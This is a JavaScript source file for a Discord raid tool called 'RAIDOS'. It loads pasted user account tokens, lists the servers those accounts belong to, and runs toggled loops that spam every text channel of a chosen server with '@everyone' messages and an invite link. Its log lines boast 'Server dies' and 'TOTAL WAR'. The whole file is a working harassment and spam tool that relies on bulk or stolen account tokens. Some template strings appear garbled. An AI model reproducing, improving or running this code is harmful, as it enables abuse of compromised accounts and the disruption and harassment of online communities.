const logElement = document.getElementById('log');
const log = (msg, color = '#0f0') => {
  const time = new Date().toLocaleTimeString();
  logElement.innerHTML += `<span style="color:\( {color}">[ \){time}] ${msg}</span><br>`;
  logElement.scrollTop = logElement.scrollHeight;
};

let tokens = [];
let currentGuildId = null;
let attacks = new Set();

const randomToken = () => tokens[Math.floor(Math.random() * tokens.length)];

// トークン入力 → 即サーバー取得
document.getElementById('token-input').addEventListener('input', async () => {
  const input = document.getElementById('token-input').value.trim();
  tokens = input.split('\n').map(t => t.trim()).filter(t => t.length > 50);
  document.getElementById('token-count').textContent = `${tokens.length} tokens armed`;

  if (tokens.length === 0) return;

  log(`Arming ${tokens.length} accounts...`, '#ff0000');
  await loadGuilds();
});

async function loadGuilds() {
  const guildMap = new Map();
  for (const token of tokens) {
    try {
      const res = await fetch('https://discord.com/api/v10/users/@me/guilds', {
        headers: { 'Authorization': token }
      });
      if (res.ok) {
        const guilds = await res.json();
        guilds.forEach(g => {
          if (!guildMap.has(g.id)) {
            guildMap.set(g.id, { id: g.id, name: g.name || 'Unknown', icon: g.icon });
          }
        });
      }
    } catch (e) {}
  }

  renderGuilds(Array.from(guildMap.values()));
}

function renderGuilds(guilds) {
  const list = document.getElementById('guild-list');
  list.innerHTML = '';
  guilds.forEach(g => {
    const div = document.createElement('div');
    div.className = 'guild-item';
    div.innerHTML = `<div class="icon">\( {g.name[0]}</div><div> \){g.name}</div>`;
    div.onclick = () => {
      document.querySelectorAll('.guild-item').forEach(i => i.classList.remove('active'));
      div.classList.add('active');
      currentGuildId = g.id;
      document.getElementById('current-guild-name').textContent = g.name;
      document.getElementById('current-guild-id').textContent = g.id;
      log(`TARGET LOCKED → ${g.name}`, '#ff0000');
    };
    list.appendChild(div);
  });
}

// 各攻撃機能（ONにしたら即実行）
document.querySelectorAll('.toggle').forEach(toggle => {
  toggle.addEventListener('click', async () => {
    const tool = toggle.dataset.toggle;
    const enabled = !toggle.classList.contains('on');
    toggle.classList.toggle('on');

    if (!currentGuildId) {
      log('No target selected!', '#ff0000');
      toggle.classList.remove('on');
      return;
    }

    if (enabled) {
      log(`${tool.toUpperCase()} ACTIVATED`, '#ff0000');
      startAttack(tool);
    } else {
      log(`${tool.toUpperCase()} STOPPED`, '#ffff00');
      attacks.delete(tool);
    }
  });
});

async function startAttack(type) {
  if (attacks.has(type)) return;
  attacks.add(type);

  while (attacks.has(type) && currentGuildId) {
    const token = randomToken();
    if (!token) break;

    try {
      if (type === 'spammer' || type === 'allchannel') {
        const channels = await fetch(`https://discord.com/api/v10/guilds/${currentGuildId}/channels`, {
          headers: { Authorization: token }
        }).then(r => r.json());

        for (const ch of channels.filter(c => c.type === 0)) {
          if (!attacks.has(type)) break;
          await fetch(`https://discord.com/api/v10/channels/${ch.id}/messages`, {
            method: "POST",
            headers: { Authorization: token, "Content-Type": "application/json" },
            body: JSON.stringify({ content: "@everyone RAIDOS WAS HERE\nhttps://discord.gg/dead" + " ".repeat(500) })
          });
          await new Promise(r => setTimeout(r, 750));
        }
      }
    } catch (e) {}

    await new Promise(r => setTimeout(r, 300));
  }
}

// Start All / Stop All
document.getElementById('start-all').onclick = () => {
  document.querySelectorAll('.toggle:not(.on)').forEach(t => t.click());
};

document.getElementById('stop-all').onclick = () => {
  attacks.clear();
  document.querySelectorAll('.toggle.on').forEach(t => t.classList.remove('on'));
  log('TOTAL WAR TERMINATED', '#ffff00');
};

// 起動
log('RAIDOS vΩ ONLINE', '#ff0000');
log('Paste tokens → Select server → Turn on toggles → Server dies', '#ff0000');
